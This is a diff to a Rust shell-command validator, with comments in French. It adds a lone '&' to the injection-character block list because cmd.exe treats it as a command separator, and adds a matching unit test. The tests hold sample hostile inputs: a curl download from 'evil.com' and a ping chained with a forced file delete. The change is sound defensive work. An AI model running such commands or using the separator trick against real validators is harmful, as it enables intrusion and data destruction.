@@ -35,7 +35,8 @@ fn blocked_commands() -> HashSet<&'static str> {
 
 /// Caracteres suspects d'injection de commandes
 fn has_injection(cmd: &str) -> bool {
-    ["&&", "||", "|", ";", ">", ">>", "<", "`", "$("].iter().any(|c| cmd.contains(c))
+    // "&" seul est un séparateur cmd.exe (cmd1 & cmd2) — autant que "&&"
+    ["&", "&&", "||", "|", ";", ">", ">>", "<", "`", "$("].iter().any(|c| cmd.contains(c))
 }
 
 /// Validation des arguments pour les commandes potentiellement dangereuses selon leurs arguments.
@@ -222,5 +223,11 @@ mod tests {
     #[test]
     fn blocks_unknown_command() {
         assert!(is_safe("curl http://evil.com/malware.exe").is_err());
+    }
+
+    #[test]
+    fn blocks_single_ampersand_injection() {
+        // "&" seul est un séparateur cmd.exe (cmd1 & cmd2), pas seulement "&&"
+        assert!(is_safe("ping 8.8.8.8 & del /f C:\\file.txt").is_err());
     }
 }
